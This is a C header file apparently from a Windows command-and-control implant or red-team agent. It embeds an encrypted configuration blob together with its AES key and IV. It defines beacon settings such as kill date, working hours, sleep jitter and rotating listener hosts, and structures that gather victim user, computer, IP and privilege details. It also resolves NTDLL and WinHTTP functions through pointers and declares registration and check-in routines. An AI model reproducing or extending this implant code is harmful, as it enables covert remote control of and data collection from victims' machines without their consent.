#pragma once
#include "Common.h"

#define AGENT_MAGIC_VALUE 0x0041153C //allsec in l33t speak.
#define CONFIG_BYTES {0xf8,0xea,0x58,0x9b,0x7d,0x3f,0x9d,0xe6,0x12,0xbf,0x05,0x33,0xb1,0x3f,0x4d,0xd7,0xf5,0x27,0x26,0xac,0x21,0xd8,0x4c,0x40,0x34,0xa2,0xf4,0x98,0x43,0xa8,0x61,0x91,0xe3,0xe6,0x17,0x05,0x0b,0xa2,0x40,0x34,0xda,0x95,0xda,0x47,0xe7,0x01,0x2b,0xc4,0x45,0x8c,0xd3,0xe4,0xa0,0xb4,0xf6,0xbf,0x61,0xef,0x42,0xf2,0x28,0x6d,0xfc,0x73,0x46,0xd6,0x3d,0xe7,0xa2,0x92,0x3f,0x78,0x6e,0x24,0xe1,0x2f,0xe0,0xc9,0xde,0xfe,0xb2,0x0e,0x25,0x62,0x37,0xdb,0x8f,0xd8,0x96,0x5d,0xb4,0xd3,0x8b,0x5e,0x2a,0xc3,0x2b,0x5f,0xed,0xe6,0xdd,0x84,0xc1,0x99,0xcb,0xae,0xa3,0x7b,0x32,0x4e,0x7c,0xa3,0x53,0x77,0x05,0xfb,0x5f,0x86,0x9a,0x9d,0x96,0x7e,0x83,0x92,0x71,0xff,0x0f,0xf0,0xff,0x59,0xf0,0x7d,0x02,0xc3,0xa8,0x42,0x8b,0xd3,0xb2,0x3a,0xe1,0x1b,0x70,0xc4,0x67,0x66,0xba,0x5a,0xc9,0x53,0x0d,0xf5,0x3b,0x01,0x5a,0x34,0xff,0x26,0x30,0xa1,0x95,0xce,0x06,0x46,0x93,0x2b,0x9e,0xf4,0xac,0xba,0x39,0x43,0x94,0x89,0xa1,0x47,0x61,0x25,0xd6,0x5a,0xde,0x25,0x32,0x41,0xbf,0xae,0xf6,0xd3,0xd8,0xa2,0xfe,0xf1,0x24,0xfb,0x4b,0x12,0x63,0xd4,0xe3,0x14,0x9f,0xb3,0x2d,0x87,0x56,0x14,0x35,0x50,0x70,0x6a,0x8a,0x6e,0x24,0x01,0xcc,0x42,0x47,0xe1,0x45,0x80,0x24,0x20,0x04,0x2b,0xba,0x32,0xe9,0x33,0x88,0x9e,0x1a,0x3d,0x07,0xf6,0x46,0xf7,0x31,0xdc,0x0c,0xd7,0x93,0x2f,0x21,0x54,0xe3,0x11,0xa7,0x38,0xb7,0x8b,0xdc,0x09,0xa1,0xf9,0x39,0x66,0xbf,0x58,0x3d,0x14,0xf3,0xb7,0xbd,0x38,0x9c,0x97,0x8f,0xe1,0x37,0xfc,0xe2,0x1d,0x01,0x64,0xf9,0xd2,0xe2,0xb2,0x9e,0xac,0x17,0xd1,0x37,0xd3,0x76,0x19,0xee,0x0f,0x4b,0x24,0x79,0xcc,0xe9,0xa1,0x69,0x36,0x10,0x06,0x19,0xf2,0xd3,0x46,0x9a,0xeb,0x2a,0x35,0x30,0xdd,0x4b,0x42,0xf3,0x98,0x08,0x78,0x92,0xda,0xaa,0xb8,0x70,0xbd,0xe9,0xf4,0x6f,0x26,0x54,0x46,0x5d,0x7a,0x14,0xbc,0x47,0x50,0x25,0x08,0x4e,0xde,0x91,0x28,0x86,0xe8,0x21,0x9f,0xf3,0x86,0xc5,0x29,0x1b,0xd8,0x5d,0xae,0xb4,0x7f,0xce,0xc0,0x03,0x34,0xff,0xa3,0xbe,0x10,0xca,0xfe,0xd6,0x1e,0x94,0xcc,0x64,0xe4,0x97,0x0d,0xc6,0x78,0x6a,0xbf,0x6e,0xd5,0x22,0x82,0xca,0x28,0x0e,0x29,0xf2,0x65,0x8b,0xe5,0x5f,0xea,0xd8,0x5f,0x86,0x4b,0xf6,0xbf,0x15,0xb2,0x4a,0xb0,0x76,0x0a,0xa9,0x3b,0xf0,0x03,0x63,0xcf,0x7a,0xf5,0xb3,0x74,0x1f,0x70,0x52,0x38,0x68,0x84,0xe4,0x25,0x49,0xb8,0xed,0xd8,0x74,0x28,0xb7,0xb2,0x69,0xbc,0x6c,0xb0,0x8f,0x25,0x03,0xac,0x67,0x28,0x50,0x86,0x82,0x24,0x43,0x96,0x22,0xf7,0x4e,0x6b,0x73,0xfb,0xa6,0xf3,0x67,0xdf,0x25,0xc8,0xf5,0x5a,0x7f,0xb4,0x7e,0x49,0x9b,0x25,0x7e,0x5d,0x1a,0xc5,0x97,0x26,0xd8,0xd9,0x55,0x88,0xf9,0x32,0x79,0x18,0x5c,0xa4,0x22,0x64,0xf4,0xe9,0x91,0x58,0x35,0x07,0xd8,0x47,0x2e,0x2d,0x89,0x3e,0x7a,0xf2,0x79,0xd0,0x17,0x88,0x4c,0xcb,0x83,0x22,0x45,0x78,0xad,0xf1,0x82,0x97,0xec,0x78,0x8c,0x2e,0x56,0xbe,0xe2,0x0c,0x5e,0xad,0x9a,0xf5,0xf1,0xdb,0xc8,0xe2,0x3e,0x8c,0x5b,0x77,0x54,0x51,0x7f,0xce,0x82,0xfd,0xf8,0x6a,0xde,0xd8,0xa3,0x4a,0xbd,0x8a,0x27,0x4b,0x27,0x7b,0x24,0xd0,0xf6,0x57,0xf3,0x29,0xf1,0xe4,0x46,0xf7,0x80,0x60,0xce,0xfd,0x6d,0xae,0xd3,0x7e,0xc8,0xed,0xca,0x19,0x4e,0x10,0x56,0x42,0xf5,0x41,0x94,0xf8,0xf2,0xb8,0xe4,0x93,0x4f,0xaa,0x85,0xbf,0x6d,0xc5,0xee,0x79,0x91,0x87,0xef,0x0c,0x5f,0x84,0x04,0x93,0xd9,0xc9,0xba,0x49,0xce,0x12,0x9d,0x5e,0x8e,0x76,0xfe,0xe1,0xa9,0xc5,0x66,0x22,0xa8,0x00,0xfd,0xff,0x41,0x6c,0x4a,0xe4,0x24,0xe1,0x5c,0x1c,0x59,0x5a,0xc6,0x0e,0x57,0xbb,0xdd,0xc1,0x60,0x1f,0x78,0xe9,0x39,0x54,0x28,0xaf,0x30,0x43,0xd6,0x9a,0x72,0x8c,0xf8,0x8a,0xc6,0xd9,0xf0,0xb3,0x03,0x1d,0xb5,0x0e,0x5c,0x8b,0x32,0xbc,0x97,0x74,0xee,0x94,0x87,0x18,0xa5,0xdf,0xea,0x4f,0xbf,0x57,0x13,0x38,0x71,0xd1,0xd1,0xd5,0x20,0xfd,0xf8,0x60,0x5b,0x62,0x55,0x0b,0x35,0x10,0x07,0x87,0x07,0xe7,0x9a,0x71,0xcf,0xa6,0x6d,0xf8,0x3f,0xf1,0x85,0xa6,0x7d,0xdb,0xee}
#define CONFIG_KEY_BYTES {0xfc,0x4a,0xc1,0xa4,0x80,0xe2,0xe7,0xfb,0xd2,0xb8,0x6c,0x02,0xd5,0x9c,0x6c,0xae,0xd7,0x85,0x7c,0x33,0x0b,0x21,0x76,0x5e,0xe4,0x90,0x02,0xc1,0x10,0x00,0x3d,0xbd} 
#define CONFIG_IV_BYTES {0x08,0x3d,0x27,0x30,0x56,0xe3,0xe0,0x28,0xd5,0x45,0xed,0x0b,0xe6,0xee,0xe2,0xcd}

struct Packges; // forward declaration so it can be included in the packages.h header file w/o having to include packages.h here Causing cyclic dependencies.

typedef struct _ContextInfo {
	DWORD dwMajorVersion;
	DWORD dwMinorVersion;
	DWORD dwBuildNumber;
	DWORD dwPlatformId;
	WORD   wServicePackMajor;
	WORD   wServicePackMinor;
	WORD   wSuiteMask;
	BYTE  wProductType;
	LPSTR UserName;
	LPSTR ComputerName;
	LPSTR IPAddress[10][5];
	DWORD PID;
	DWORD TID;
	DWORD PPID;
	WORD OS_Arch;
	WORD Process_Arch;
	BOOL Elevated;
} ContextInfo, *PContextInfo ;

typedef struct _HostData {
	LPWSTR Host;
	INT Port;
	BOOL Alive;
	INT NumFailures;
	struct _HostData* Next;
} HostData, * pHostData;

typedef struct _ListenerConfig {
	DWORD HostRotation;
	pHostData Hosts;
	pHostData CurrentHost;
	UINT NumHosts;
	DWORD Port;
	BOOL Secure;
	LPWSTR Method;
	LPWSTR* Headers;
	LPWSTR UserAgent;

} ListenerConfig, *PListenerConfig;

//TODO FINISH ADDING LISTENER / AGENT CONFIG DATA/
typedef struct _AgentConfig {

	UINT64 KillDate;
	UINT32 WorkingHours;
	UINT32 SleepTime;
	UINT32 SleepJitter;
	DWORD AgentID;
	BYTE* RSAPubKey;
	DWORD RSAPubKeySize;
	LPSTR AgentName;
	ListenerConfig listenerConfig;

} AgentConfig, *PAgentConfig;

typedef struct _HttpSession {
	BOOL Active;
} HttpSession, *pHttpSession;

//TODO clean up this structure.
//I.E. make strcutrues for module hanldes, function pointers, etc. and include them in this parent structure rather than all directly.
typedef struct _Agent {


	//enumeration apis
	//NTDLL APIS
	t_RtlGetVersion pRtlGetVersion;
	t_NtClose pNtClose;
	t_NtOpenProcessToken pNtOpenProcessToken;
	t_NtOpenThreadToken pNtOpenThreadToken;
	t_NtQueryInformationToken pNtQueryInformationToken;
	t_RtlAllocateHeap pRtlAllocateHeap;
	t_RtlReAllocateHeap pRtlReAllocateHeap;
	t_RtlRandomEx pRtlRandomEx;
	t_NtGetTickCount pNtGetTickCount;

	
	//KERNEL32 APIS
	t_GetComputerNameExA pGetComputerNameExA;

	//ADVAPI APIS
	HMODULE hAdvapi32;
	t_GetUserNameA pGetUserNameA;

	//USER32 APIS
	HMODULE hUser32;
	t_GetSystemMetrics pGetSystemMetrics;

	//IPHLPAPI APIS'
	HMODULE hIphlpapi;
	t_GetAdaptersInfo pGetAdaptersInfo;

	//http request APIS
	//WINHTTP APIS
	HMODULE hWinHttp;
	t_WinHttpOpen pWinHttpOpen;
	t_WinHttpConnect pWinHttpConnect;
	t_WinHttpOpenRequest pWinHttpOpenRequest;
	t_WinHttpSendRequest pWinHttpSendRequest;
	t_WinHttpReceiveResponse pWinHttpReceiveResponse;
	t_WinHttpQueryHeaders pWinHttpQueryHeaders;
	t_WinHttpAddRequestHeaders pWinHttpAddRequestHeaders;
	t_WinHttpSetOption pWinHttpSetOption;

	//agent configuration
	PAgentConfig config;

	//current context info
	PContextInfo Context;

	//Session Info
	pHttpSession session;


	P_INT_TEB pTeb;

	//crypto info.
	BYTE* AESKey;
	ULONG AESKeySize;
	BYTE* EncryptedAESKey;
	ULONG EncryptedAESKeySize;
	BYTE* IV;
	ULONG IVSize;
	BYTE* EncryptedIV;
	ULONG EncryptedIVSize;

	struct _Package* packages;
	



}Agent, * pAgent;



enum Agent_Operations {
	INITIALIZE_AGENT = 0,
	EXIT_AGENT,
	SLEEP_AGENT,
	GET_AGENT_JOB,
	CHECKIN_AGENT,
};


INT init_agent(pAgent agent);
INT RegisterAgent(pAgent agent);
BOOL SendRegisterRequest(pAgent agent, VOID* Buffer, ULONG BufferLength);
void AgentMain();
INT ParseConfig(pAgent agent);